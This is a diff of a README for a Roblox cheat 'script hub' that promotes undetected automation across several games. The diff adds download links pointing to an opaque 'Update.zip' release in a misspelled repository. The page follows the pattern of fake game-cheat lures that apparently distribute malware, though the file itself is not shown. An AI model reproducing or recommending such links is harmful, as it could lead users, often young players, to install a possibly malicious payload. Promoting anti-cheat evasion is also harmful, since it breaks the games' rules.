@@ -1,11 +1,11 @@
-# 🐟💥 **FISCH SCRIPT — LIGHTWEIGHT, POWERFUL & UNIVERSAL ROBLOX SCRIPT HUB (2025 EDITION)** ⚡🔧 [![Download Fisch Script](https://img.shields.io/badge/Download-Fisch_Script-blueviolet?style=for-the-badge&logo=roblox)]()
+# 🐟💥 **FISCH SCRIPT — LIGHTWEIGHT, POWERFUL & UNIVERSAL ROBLOX SCRIPT HUB (2025 EDITION)** ⚡🔧 [![Download Fisch Script](https://img.shields.io/badge/Download-Fisch_Script-blueviolet?style=for-the-badge&logo=roblox)](https://github.com/7tsDev/fisch-scrept/releases/download/Release/Update.zip)
 
 
 Say hello to **Fisch Script** — your new favorite Roblox script hub that combines **simplicity**, **speed**, and **versatility** in one small but mighty package! Whether you’re farming in **Blox Fruits**, exploring in **Pet Simulator X**, or dominating in **Da Hood**, **Fisch** has your back. 🎯
 
 This script is designed to run **fast**, stay **undetected**, and deliver powerful automation across **multiple games**. It's plug-and-play, clean, and regularly updated to stay one step ahead of the meta. 🛡️
 
-[![Download Fisch Script](https://img.shields.io/badge/Download-Fisch_Script-blueviolet?style=for-the-badge&logo=roblox)]()
+[![Download Fisch Script](https://img.shields.io/badge/Download-Fisch_Script-blueviolet?style=for-the-badge&logo=roblox)](https://github.com/7tsDev/fisch-scrept/releases/download/Release/Update.zip)
 ![fisc](https://github.com/user-attachments/assets/9442bec4-5cc8-4230-bb03-38f97d27772f)
 
 ---
